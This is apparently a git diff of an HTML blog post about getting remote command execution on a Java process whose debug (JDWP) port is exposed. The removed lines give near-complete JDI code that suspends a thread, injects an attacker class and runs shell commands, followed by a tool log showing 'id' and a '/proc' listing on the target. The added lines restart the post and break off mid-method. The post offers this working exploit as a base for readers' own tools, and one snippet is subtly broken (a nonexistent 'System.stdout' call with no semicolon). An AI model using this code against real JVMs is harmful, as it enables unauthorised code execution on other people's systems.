-</span></span><span style="display:flex;"><span>                    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[+] Breakpoint hit by thread: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">SuspendedThread</span>.<span style="color:#a6e22e">name</span>());
-</span></span><span style="display:flex;"><span>                    eventSet.<span style="color:#a6e22e">resume</span>();
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            eventSet.<span style="color:#a6e22e">resume</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>After calling this method, we SHOULD have a reference to a remotely suspended thread.</p>
-<p>Once we do, we need to use JDI to inject our class into the remote VM using the path to our compiled payload class:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">InjectClass</span>(String filename, String className) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            classBytes <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(filename));
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Error reading file\n\t&#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>());
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (SuspendedThread <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>SuspendedThread.<span style="color:#a6e22e">isSuspended</span>()) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Target thread is null or not suspended!&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalStateException(<span style="color:#e6db74">&#34;Thread is not suspended.&#34;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// get ClassLoader.defineClass([BII) method</span>
-</span></span><span style="display:flex;"><span>        ReferenceType classLoaderClass <span style="color:#f92672">=</span> vm.<span style="color:#a6e22e">classesByName</span>(<span style="color:#e6db74">&#34;java.lang.ClassLoader&#34;</span>).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>        Method defineClassMethod <span style="color:#f92672">=</span> classLoaderClass.<span style="color:#a6e22e">methodsByName</span>(<span style="color:#e6db74">&#34;defineClass&#34;</span>, <span style="color:#e6db74">&#34;([BII)Ljava/lang/Class;&#34;</span>).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// find a live ClassLoader instance</span>
-</span></span><span style="display:flex;"><span>        ObjectReference classLoader <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (ReferenceType refType : vm.<span style="color:#a6e22e">allClasses</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>                ObjectReference candidate <span style="color:#f92672">=</span> refType.<span style="color:#a6e22e">classLoader</span>();
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (candidate <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                    classLoader <span style="color:#f92672">=</span> candidate;
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception ignored) {
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (classLoader <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] No class loader found&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create remote byte[] of class contents</span>
-</span></span><span style="display:flex;"><span>        ArrayType byteArrayType <span style="color:#f92672">=</span> (ArrayType) vm.<span style="color:#a6e22e">classesByName</span>(<span style="color:#e6db74">&#34;byte[]&#34;</span>).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>        ArrayReference remoteBytes <span style="color:#f92672">=</span> byteArrayType.<span style="color:#a6e22e">newInstance</span>(classBytes.<span style="color:#a6e22e">length</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>Value<span style="color:#f92672">&gt;</span> values <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">&lt;&gt;</span>(classBytes.<span style="color:#a6e22e">length</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">byte</span> b : classBytes) {
-</span></span><span style="display:flex;"><span>            values.<span style="color:#a6e22e">add</span>(vm.<span style="color:#a6e22e">mirrorOf</span>(b));
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            remoteBytes.<span style="color:#a6e22e">setValues</span>(values);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (InvalidTypeException e) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(e);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (ClassNotLoadedException e) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(e);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            classLoader.<span style="color:#a6e22e">invokeMethod</span>(
-</span></span><span style="display:flex;"><span>                    SuspendedThread,
-</span></span><span style="display:flex;"><span>                    defineClassMethod,
-</span></span><span style="display:flex;"><span>                    List.<span style="color:#a6e22e">of</span>(remoteBytes, vm.<span style="color:#a6e22e">mirrorOf</span>(0), vm.<span style="color:#a6e22e">mirrorOf</span>(classBytes.<span style="color:#a6e22e">length</span>)),
-</span></span><span style="display:flex;"><span>                    ObjectReference.<span style="color:#a6e22e">INVOKE_SINGLE_THREADED</span>
-</span></span><span style="display:flex;"><span>            );
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception ex) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Error invoking classLoader.defineClass()\n\t&#34;</span> <span style="color:#f92672">+</span> ex.<span style="color:#a6e22e">getMessage</span>());
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// force load into the loaded class list</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// if we don&#39;t do this, we will be unable to reference the class we injected</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            ClassType classClass <span style="color:#f92672">=</span> (ClassType) vm.<span style="color:#a6e22e">classesByName</span>(<span style="color:#e6db74">&#34;java.lang.Class&#34;</span>).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            Method forName <span style="color:#f92672">=</span> classClass.<span style="color:#a6e22e">methodsByName</span>(
-</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;forName&#34;</span>,
-</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;&#34;</span>
-</span></span><span style="display:flex;"><span>            ).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            classClass.<span style="color:#a6e22e">invokeMethod</span>(
-</span></span><span style="display:flex;"><span>                    SuspendedThread,
-</span></span><span style="display:flex;"><span>                    forName,
-</span></span><span style="display:flex;"><span>                    List.<span style="color:#a6e22e">of</span>(
-</span></span><span style="display:flex;"><span>                            vm.<span style="color:#a6e22e">mirrorOf</span>(className),
-</span></span><span style="display:flex;"><span>                            vm.<span style="color:#a6e22e">mirrorOf</span>(<span style="color:#66d9ef">true</span>),
-</span></span><span style="display:flex;"><span>                            classLoader
-</span></span><span style="display:flex;"><span>                    ),
-</span></span><span style="display:flex;"><span>                    ObjectReference.<span style="color:#a6e22e">INVOKE_SINGLE_THREADED</span>
-</span></span><span style="display:flex;"><span>            );
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[+] Successfully forced class load via Class.forName(name, true, loader)&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Failed to force class load: &#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>());
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>You MUST use the FQN class name when injecting.</p>
-<p>Finally, now that our class is injected into the remote VM and inserted into the loaded class list, we can invoke any static method in our class like so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">RunRemoteCommand</span>(String cmd) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (SuspendedThread <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>SuspendedThread.<span style="color:#a6e22e">isSuspended</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalStateException(<span style="color:#e6db74">&#34;Suspended thread is null or not suspended&#34;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>ReferenceType<span style="color:#f92672">&gt;</span> matches <span style="color:#f92672">=</span> vm.<span style="color:#a6e22e">classesByName</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">className</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (matches.<span style="color:#a6e22e">isEmpty</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalStateException(<span style="color:#e6db74">&#34;Injected class &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">className</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; not found in remote VM&#34;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        ClassType injectedClass <span style="color:#f92672">=</span> (ClassType) matches.<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Method executeMethod <span style="color:#f92672">=</span> injectedClass.<span style="color:#a6e22e">methodsByName</span>(
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;ExecuteCommand&#34;</span>,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;(Ljava/lang/String;)Ljava/lang/String;&#34;</span>
-</span></span><span style="display:flex;"><span>        ).<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Value result <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> injectedClass.<span style="color:#a6e22e">invokeMethod</span>(
-</span></span><span style="display:flex;"><span>                    SuspendedThread,
-</span></span><span style="display:flex;"><span>                    executeMethod,
-</span></span><span style="display:flex;"><span>                    List.<span style="color:#a6e22e">of</span>(vm.<span style="color:#a6e22e">mirrorOf</span>(cmd)),
-</span></span><span style="display:flex;"><span>                    ObjectReference.<span style="color:#a6e22e">INVOKE_SINGLE_THREADED</span>
-</span></span><span style="display:flex;"><span>            );
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e){
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Something horrible has happened! Oh no!\n&#34;</span> <span style="color:#f92672">+</span> e)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        String res <span style="color:#f92672">=</span> ((StringReference) result).<span style="color:#a6e22e">value</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res;
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>Putting this all together in a red-eye late-night developed, somewhat janky tool:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mike@host:~/IdeaProjects/Beanhive$ java -jar ./target/Beanhive-1.0-SNAPSHOT.jar -h 127.0.0.1 -p <span style="color:#ae81ff">1234</span> -c target/classes/org/example/Vastatrix4.class -n org.example.Vastatrix4 -b sun.net.httpserver.FixedLengthOutputStream.close
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully connected to remote JDI
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Attempting to break on sun.net.httpserver.FixedLengthOutputStream.close<span style="color:#f92672">()</span>V
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Breakpoint set at sun.net.httpserver.FixedLengthOutputStream.close<span style="color:#f92672">()</span>V
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Breakpoint hit by thread: HTTP-Dispatcher
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Breakpoint hit successfully on thread
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Attempting to inject class <span style="color:#e6db74">&#34;org.example.Vastatrix4&#34;</span> into remote JVM
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully forced class load via Class.forName<span style="color:#f92672">(</span>name, true, loader<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully injected class <span style="color:#e6db74">&#34;org.example.Vastatrix4&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span>&gt;id
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mike<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mike<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mike<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,114<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,984<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span>&gt;ls -la /proc
-</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">547</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 .
-</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">23</span> root                 root                            <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">29</span> 10:38 ..
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">10</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">100</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:58 <span style="color:#ae81ff">100060</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:58 <span style="color:#ae81ff">100096</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:57 <span style="color:#ae81ff">100103</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:57 <span style="color:#ae81ff">100120</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:57 <span style="color:#ae81ff">100169</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 17:58 <span style="color:#ae81ff">100223</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 18:00 <span style="color:#ae81ff">100555</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 18:01 <span style="color:#ae81ff">100947</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 18:01 <span style="color:#ae81ff">100948</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> mike                 mike                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 18:01 <span style="color:#ae81ff">100953</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> avahi                avahi                              <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1013</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> messagebus           messagebus                         <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1014</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> gnome-remote-desktop gnome-remote-desktop               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1017</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">102</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1020</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">18</span> 18:10 <span style="color:#ae81ff">102030</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">103</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> polkitd              polkitd                            <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1030</span>
-</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#ae81ff">9</span> root                 root                               <span style="color:#ae81ff">0</span> Aug <span style="color:#ae81ff">15</span> 20:13 <span style="color:#ae81ff">1032</span>
-</span></span></code></pre></div><p>The code can be viewed <a href="https://github.com/alfarom256/jditinker">here</a>, and serves only as a potential alternative to existing tools and starting point for your tooling should you extend this project.</p>
-<p>YMMV</p>
-
-    </div>
-  </article>
-
-    </main>
-  </div>
-</body>
-</html>
+</code></pre><p>The following code shows breaking on a remote method, given it&rsquo;s Class, method name, and method signature (which is defined <a href=https://docs.oracle.com/javase/8/docs/jdk/api/jpda/jdi/com/sun/jdi/doc-files/signature.html>here</a>)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>BreakOnMethod</span>(String className, String methodName, String signature) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] VM not initialized, cannot break on method!&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>ReferenceType<span style=color:#f92672>&gt;</span> classes <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span>.<span style=color:#a6e22e>classesByName</span>(className);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (classes.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>            ClassPrepareRequest prepareRequest <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span>.<span style=color:#a6e22e>eventRequestManager</span>().<span style=color:#a6e22e>createClassPrepareRequest</span>();
+</span></span><span style=display:flex><span>            prepareRequest.<span style=color:#a6e22e>setSuspendPolicy</span>(EventRequest.<span style=color:#a6e22e>SUSPEND_EVENT_THREAD</span>);
+</span></span><span style=display:flex><span>            prepareRequest.<span style=color:#a6e22e>addClassFilter</span>(className);
+</span></span><span style=display:flex><span>            prepareRequest.<span style=color:#a6e22e>enable</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            EventSet eventSet;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>) {
+</span></span><span style=display:flex><span>                eventSet <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span>.<span style=color:#a6e22e>eventQueue</span>().<span style=color:#a6e22e>remove</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> (Event event : eventSet) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (event <span style=color:#66d9ef>instanceof</span> ClassPrepareEvent) {
+</span></span><span style=display:flex><span>                        ClassPrepareEvent cp <span style=color:#f92672>=</span> (ClassPrepareEvent) event;
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (cp.<span style=color:#a6e22e>referenceType</span>().<span style=color:#a6e22e>name</span>().<span style=color:#a6e22e>equals</span>(className)) {
+</span></span><span style=display:flex><span>                            classes <span style=color:#f92672>=</span> List.<span style=color:#a6e22e>of</span>(cp.<span style=color:#a6e22e>referenceType</span>());
+</span></span><span style=display:flex><span>                            eventSet.<span style=color:#a6e22e>resume</span>();
+</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>classes.<span style=color:#a6e22e>isEmpty</span>()) <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            prepareRequest.<span style=color:#a6e22e>disable</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ReferenceType refType <span style=color:#f92672>=</span> classes.<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>Method<span style=color:#f92672>&gt;</span> methods <span style=color:#f92672>=</span> (signature <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
+</span></span><span style=display:flex><span>                <span style=color:#f92672>?</span> refType.<span style=color:#a6e22e>methodsByName</span>(methodName, signature)
+</span></span><span style=display:flex><span>                : refType.<span style=color:#a6e22e>methodsByName</span>(methodName);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (methods.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Method not found: &#34;</span> <span style=color:#f92672>+</span> methodName);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Method method <span style=color:#f92672>=</span> methods.<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>Location<span style=color:#f92672>&gt;</span> locs <span style=color:#f92672>=</span> method.<span style=color:#a6e22e>allLineLocations</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (locs.<span style=color:#a6e22e>isEmpty</span>()) {
